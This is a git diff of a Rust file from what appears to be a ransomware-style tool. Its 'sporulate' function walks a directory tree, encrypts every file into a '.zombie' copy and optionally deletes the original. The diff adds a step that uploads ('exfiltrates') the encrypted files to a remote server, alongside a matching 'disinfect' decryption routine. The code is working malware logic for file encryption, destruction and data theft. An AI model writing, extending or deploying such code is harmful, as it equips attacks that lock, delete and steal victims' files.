@@ -8,7 +8,8 @@ use std::{
     path::Path,
 };
 
-use log::{debug, info};
+use log::{debug, error, info};
+use reqwest::Client;
 use walkdir::WalkDir;
 
 use crate::{
@@ -17,6 +18,7 @@ use crate::{
         load_public_key,
     },
     error::AppError,
+    net::upload_file,
 };
 
 // Rust lifetimes make me wanna cry--pun intended
@@ -59,8 +61,7 @@ const EXCLUDED_FILES: &[&str] = &[
 /// - `path`: Starting directory as a `PathBuf`
 /// - `key`: Pathbuf to the private key to decrypt files--see README
 /// - `no_delete`: Boolean flag: false means the original file is deleted
-/// - `server`: String representing the target server
-/// - `target_folder`: `Option<String>` for a specific folder on the server
+/// - `server`: String representing the target server, like `http://server:2673`
 ///
 /// # Logic
 /// Uses `HashSet` for efficient lookups of excluded names.
@@ -68,12 +69,15 @@ const EXCLUDED_FILES: &[&str] = &[
 ///   - Encrypts the file generating a `.zombie` version
 ///   - Sends the encrypted file to the target server
 ///   - Optinally, deletes the original file locally
-pub fn sporulate(
+///
+/// # Returns
+/// Returns a unit type if finished with success or an AppError if it fails.
+#[tokio::main]
+pub async fn sporulate(
     path: &Path,
     key: &Path,
     no_delete: &bool,
-    server: &String,
-    target_folder: &Option<String>,
+    server: &Option<String>,
 ) -> Result<(), AppError> {
     if !path.exists() {
         return Err(AppError::Io(io::Error::new(
@@ -95,6 +99,8 @@ pub fn sporulate(
     let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
     let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();
 
+    let client = Client::new();
+
     // Iterator creation and customization: Takes a path and creates a lazy
     // iterator that traverses the directory tree--only scans the file system
     // as needed.
@@ -108,13 +114,12 @@ pub fn sporulate(
             let file_name = entry.file_name();
             let file_path = entry.path();
 
-            if entry.file_type().is_dir() {
-                if let Some(file_name) = file_name.to_str() {
-                    if excluded_dirs_set.contains(file_name) {
-                        debug!("Skipping folder {}", file_path.display());
-                        return false;
-                    }
-                }
+            if entry.file_type().is_dir()
+                && let Some(file_name) = file_name.to_str()
+                && excluded_dirs_set.contains(file_name)
+            {
+                debug!("Skipping folder {}", file_path.display());
+                return false;
             }
 
             if entry.file_type().is_file() {
@@ -134,35 +139,40 @@ pub fn sporulate(
             }
             true
         })
-        .filter_map(Result::ok);
+        .filter_map(Result::ok)
+        .filter(|entry| entry.file_type().is_file());
 
     // This loop consumes the walker iterator and as the loop progresses,
     // it asks for the next item from the iterator--this request triggers
     // the iterator to scan the file system!
-    info!(
-        "Starting encryption process: path={:?}, server={}, target_folder={:?}, no_delete={}",
-        path, server, target_folder, no_delete
-    );
+    info!("Starting encryption process: path={:?}", path);
     for entry in walker {
-        // Avoiding directories
-        if entry.file_type().is_file() {
-            let file_path = entry.path();
+        let file_path = entry.path();
 
-            debug!("Encrypting file: {:?}", file_path);
-            encrypt(file_path, &public_key)?;
-
-            if !no_delete {
-                debug!("Deleting original file: {:?}", file_path);
-                fs::remove_file(file_path)?;
+        debug!("Encrypting file: {:?}", file_path);
+        let zombie = match encrypt(file_path, &public_key) {
+            Ok(z) => z,
+            Err(e) => {
+                error!("Failed to encrypt file {:?}: {}", file_path, e);
+                continue;
             }
+        };
 
-            let action_message = format!("Upload {} to server {}", file_path.display(), server);
-            if let Some(folder) = &target_folder {
-                debug!("{}, target folder {}", action_message, folder);
-            } else {
-                debug!("{}", action_message);
+        if !no_delete {
+            debug!("Deleting original file: {:?}", file_path);
+            if let Err(e) = fs::remove_file(file_path) {
+                error!("Failed to delete file {:?}: {}", file_path, e);
+                continue;
             }
         }
+
+        if let Some(address) = server {
+            debug!("Exfiltrating file: {:?}", zombie);
+            if let Err(e) = upload_file(&client, address, &zombie).await {
+                error!("Failed to exfiltrate file {:?}: {}", file_path, e);
+                continue;
+            }
+        };
     }
     info!("Encryption process completed successfully");
     Ok(())
@@ -216,12 +226,18 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppErr
     );
     for entry in walker {
         let file_path = entry.path();
+
         debug!("Decrypting file: {:?}", file_path);
-        decrypt(file_path, &private_key)?;
+        if let Err(e) = decrypt(file_path, &private_key) {
+            error!("Failed to decrypt file {:?}: {}", file_path, e);
+            continue;
+        };
 
         if !no_delete {
             debug!("Deleting .zombie file: {:?}", file_path);
-            fs::remove_file(file_path)?;
+            if let Err(e) = fs::remove_file(file_path) {
+                error!("Failed to delete file: {:?}: {}", file_path, e)
+            }
         }
     }
 
